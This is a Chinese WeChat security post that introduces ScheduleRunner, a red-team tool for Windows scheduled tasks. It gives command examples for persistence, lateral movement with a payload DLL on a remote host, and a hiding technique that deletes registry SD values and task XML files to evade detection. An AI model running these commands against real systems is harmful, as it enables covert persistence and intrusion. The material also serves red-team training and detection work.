> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/FnlX1Kq1RTBBgd5oV2qaTw)

**ScheduleRunner -** **一个****C#** **工具，可更灵活地自定义计划任务，以实现红队操作中的持久性和横向移动**

**https://github.com/netero1010/ScheduleRunner**

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/shVkAyu04IFfrE4xOgibpo4cVX32zGu78Y2gmuvAgMJicCY3NZsk47MeIRn7NmbXLREadN6wzIicic4aicZAEHSzCNA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

计划任务是过去十年中最流行的攻击技术之一，现在它仍然被黑客/红队常用来进行持久性和横向移动。

**创建一个名为**`Cleanup`**的计划任务，该任务将在每天晚上** **11:30** **执行**

```
ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:"Somedescription" /author:netero1010
```

  

**创建一个名为**`Cleanup`**的计划任务，该任务将在远程服务器上每** **4** **小时执行一次**

```
ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:hourly /modifier:4 /program:rundll32.exe /argument:c:\temp\payload.dll/remoteserver:TARGET-PC01
```

  

**删除名为**`Cleanup`**的计划任务**

```
ScheduleRunner.exe /method:delete /taskname:Cleanup
```

  

**执行名为**`Cleanup`**的计划任务**

```
ScheduleRunner.exe /method:run /taskname:Cleanup
```

  

**查询远程服务器上****“\Microsoft\Windows\CertificateServicesClient”****文件夹下名为**`Cleanup`**的计划任务的详细信息**

```
ScheduleRunner.exe /method:query /taskname:Cleanup /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01
```

  

**查询远程服务器上特定文件夹****"\Microsoft\Windows\CertificateServicesClient"****下的所有计划任务**

```
ScheduleRunner.exe /method:query /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01
```

  

**查询计划任务中的所有子文件夹**

```
ScheduleRunner.exe /method:queryfolders
```

  

**使用计划任务执行横向移动到使用特定用户帐户的远程服务器**

```
ScheduleRunner.exe /method:move /taskname:Demo /remoteserver:TARGET-PC01 /program:rundll32.exe /argument:c:\temp\payload.dll /user:netero1010
```

  

**使用隐藏计划任务技术创建一个名为****“****清理****”****的计划任务：**

```
ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:"Somedescription" /author:netero1010 /technique:hide
```

  

**删除使用隐藏计划任务技术的名为**`Cleanup`**的计划任务：**

  

```
ScheduleRunner.exe /method:delete /taskname:Cleanup /technique:hide
```

**隐藏计划任务技术**
------------

**早在2021年有被研究过****https://paper.seebug.org/1464/**

**最近微软才捕获到有工具名为Tarrask的防御规避恶意软件，该恶意软件创建“隐藏”计划任务，以及删除任务属性的后续操作，以隐藏传统的计划任务识别手段。**

**本工具（ScheduleRunner）旨在使计划任务无法被工具查询，并且无法被任务计划程序看到。**

**要使用此技术，需要拥有SYSTEM权限， ScheduleRunner 将执行以下操作：**

**从"HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Schedule\TaskCache\Tree\[任务名称]"中删除"SD"值**

**删除计划任务 XML 文件"C:\Windows\System32\Tasks\[任务名称]"**

**要删除使用此技术创建的计划任务，需要在删除方法中添加"/technique:hide"。**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

如有侵权，请联系删除

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

好文推荐

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

[工具|红队快速批量打点](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501726&idx=1&sn=7340d2d736b8b675044fcd027734edfa&chksm=c30814eef47f9df8c5b0b3bdec2c7ee32719efb8ac421fd7f100f801553c760a8544dfa9e5eb&scene=21#wechat_redirect)

[实战 | App优惠劵无限领取漏洞挖掘记录](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501691&idx=1&sn=a85286aa98162257c6bd27c580958149&chksm=c308140bf47f9d1dcd77fee53ea5bc33dd2e4a51d49128bc4e250a2b9de871b4b38ad0b9c352&scene=21#wechat_redirect)  

[利用 EHole 进行红队快速批量打点](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501551&idx=1&sn=def3dc507ccf0db02d6bbbef1bcc607c&chksm=c308159ff47f9c894fb9f4e377e5932dbdd4c23b2cc1174327f7ac75ef3418a20a97a7a35f8c&scene=21#wechat_redirect)  

[神兵利器 - presshell](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501226&idx=1&sn=58c19eb68666549b7a762e0884b50614&chksm=c30816daf47f9fcc70a684e98595e7e3815b7466f53e89fd133367cd3b8bc3433c39c44205ad&scene=21#wechat_redirect)  

[渗透测试-Ngrok内网映射与穿透](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501189&idx=1&sn=eef208ca1b4148b21252714c4406ee1a&chksm=c30816f5f47f9fe31d55282360f6005ca294fdc651913436e6b80799c4e6b70d943c7c0bc2c6&scene=21#wechat_redirect)  

[分享 | 几种实战成功过的webshell免杀方式](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501226&idx=2&sn=54fac5717f8d7198961846c04527deee&chksm=c30816daf47f9fcc33673cc2b8080a4b7a1d54c8f22ba623cb60514173bd1dc7564fa52e781b&scene=21#wechat_redirect)  

[推荐一款自动向hackerone发送漏洞报告的扫描器](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501261&idx=1&sn=0ac4d45935842842f32c7936f552ee21&chksm=c30816bdf47f9fab5900c9bfd6cea7b1d99cd32b65baec8006c244f9041b25d080b2f23fd2c1&scene=21#wechat_redirect)  

[李姐姐开源DNSLog工具eyes.sh](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501334&idx=1&sn=c6469632a877719433b4144656b0c2d8&chksm=c3081566f47f9c70595486954a92757fe6b0ea2d812650420cdccc8d3170b5135f5e3d303728&scene=21#wechat_redirect)  

  

**欢迎关注 系统安全运维**

 ![](http://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI5Hhs9CtEc9atTYUNrfH9zfLGicoHntIkIex17H7tPq294ufnMXwkwrFwqJ0rJGia2Eo16J8XcgxJDg/0?wx_fmt=png) ** 系统安全运维 ** 未知攻 焉知防 攻防兼备 16篇原创内容   公众号